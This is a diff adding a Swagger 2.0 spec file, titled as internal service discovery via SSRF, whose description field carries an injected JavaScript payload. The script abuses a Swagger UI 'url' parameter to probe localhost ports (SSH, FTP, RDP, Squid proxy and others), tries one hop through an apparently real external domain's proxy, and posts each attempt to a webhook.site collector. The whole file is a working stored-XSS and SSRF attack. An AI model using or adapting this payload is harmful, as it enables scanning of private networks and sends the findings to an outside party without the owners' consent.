@@ -1,0 +1,46 @@
+swagger: "2.0"
+info:
+  title: "Internal Service Discovery via SSRF"
+  description: |
+    <script>
+      // Testar serviços nas portas descobertas
+      var internalServices = [
+        'http://localhost:21',      // FTP
+        'http://localhost:22',      // SSH
+        'http://localhost:80',      // HTTP
+        'http://localhost:81',      // HTTP
+        'http://localhost:82',      // HTTP
+        'http://localhost:88',      // HTTP
+        'http://localhost:99',      // HTTP
+        'http://localhost:100',     // HTTP
+        'http://localhost:111',     // RPC
+        'http://localhost:113',     // Ident
+        'http://localhost:443',     // HTTPS
+        'http://localhost:3128',    // Squid Proxy
+        'http://localhost:3389',    // RDP
+        'http://localhost:8080',    // HTTP
+        'ftp://localhost:21',       // FTP protocol
+        'http://127.0.0.1:3128',    // Squid interno
+        // Tentar acessar via proxy
+        'http://utanga.co.ao:3128/http://localhost:3389'
+      ];
+      
+      internalServices.forEach(service => {
+        // Usar Swagger SSRF para testar
+        var ssrfUrl = '/api/swagger/index.html?url=' + encodeURIComponent(service);
+        
+        fetch(ssrfUrl, {mode: 'no-cors'})
+          .then(() => {
+            console.log('SSRF attempt to:', service);
+            // Registrar no webhook
+            fetch('https://webhook.site/f3880c57-1d67-42ff-b415-4d02c16d37a5', {
+              method: 'POST',
+              body: 'SSRF to: ' + service
+            });
+          })
+          .catch(e => console.log('Failed:', service));
+      });
+      
+      alert('Internal service scan via SSRF initiated');
+    </script>
+paths: {}
